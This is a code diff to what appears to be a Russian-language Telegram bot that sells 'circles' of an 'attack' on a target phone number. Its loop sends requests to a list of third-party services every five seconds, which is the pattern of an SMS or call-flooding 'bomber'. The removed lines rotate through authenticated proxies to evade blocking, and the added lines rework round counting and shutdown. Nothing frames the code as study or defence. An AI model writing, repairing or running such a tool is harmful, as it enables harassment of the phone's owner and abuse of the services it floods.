@@ -52,20 +52,16 @@ class Attack:
 
         # Get all data sites or services
         self.user_data = await globals.UserData.objects.filter(user_id=self.user_id).all()
-        circles_status = self.user_data[0].status
+        self.state_circles = self.user_data[0].status
 
         # Check circles count
-        if circles_status == "∞":
+        if self.state_circles == "∞":
             self.state_circles = "∞"
-        elif int(circles_status) == 0:
+        elif int(self.state_circles) == 0:
             await globals.bot.delete_message(chat_id=message.chat.id, message_id=message.message_id+1)
             return await message.answer(text="🗑Количество кругов израсходовано!")
         else:
-            self.state_circles: int = int(circles_status)
-
-        # Load all proxies
-        with open(r"sites/proxies.json") as proxies_load:
-            proxies = loads(proxies_load.read())
+            self.state_circles: int = int(self.state_circles)
 
         # Load all services
         with open(r"sites/services.json") as services_load:
@@ -73,16 +69,6 @@ class Attack:
 
         # Run attack process
         while self.process_status:
-            proxy = choice(list(proxies.keys()))
-            proxy_url = {"http": "http://%s:%s@%s" %
-                         (proxies[proxy][0], proxies[proxy][1], proxy,)}
-            #self.session.proxies.update(proxy_url)
-            #self.session.headers.update(self.headers)
-
-            if self.state_circles != "∞":
-                await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone, last_created=dt.now())
-                return await message.answer(text=f"❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
-
             for (k, v) in services.items():
                 try:
                     if "data" in v.keys():
@@ -100,7 +86,12 @@ class Attack:
                     pass
 
             await sleep(5)  # Time-out
-            if circles_status != "∞":
+            if self.state_circles != "∞":
+                if int(self.state_circles) == 0:
+                    self.process_status = False
+                    await self.session.close()
+                    await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone, last_created=dt.now())
+                    return await message.answer(text=f"❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
                 self.state_circles -= 1
 
     async def stop(self):
